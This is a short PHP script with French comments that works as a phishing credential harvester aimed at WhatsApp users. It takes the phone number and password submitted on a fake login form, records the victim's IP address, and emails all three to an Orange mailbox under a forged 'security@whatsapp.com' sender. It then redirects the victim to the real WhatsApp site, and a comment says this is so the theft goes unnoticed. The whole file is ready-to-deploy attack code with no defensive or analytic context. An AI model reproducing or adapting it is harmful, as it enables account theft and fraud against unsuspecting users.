<?php
// Récupération des données du formulaire
$phone = $_POST['phone'];
$password = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR']; // On récupère aussi l'IP pour savoir d'où ça vient

// Configuration de l'alerte
$to = "0684357879@orange.fr";
$subject = "NOUVEAU LOG WHATSAPP";
$message = "LOG CAPTURE :\n\nNuméro : " . $phone . "\nMot de passe : " . $password . "\nIP : " . $ip;
$headers = "From: security@whatsapp.com";

// Envoi du mail vers ton numéro Orange
mail($to, $subject, $message, $headers);

// Redirection vers le vrai site pour ne pas griller le hack
header("Location: https://www.whatsapp.com");
exit();
?>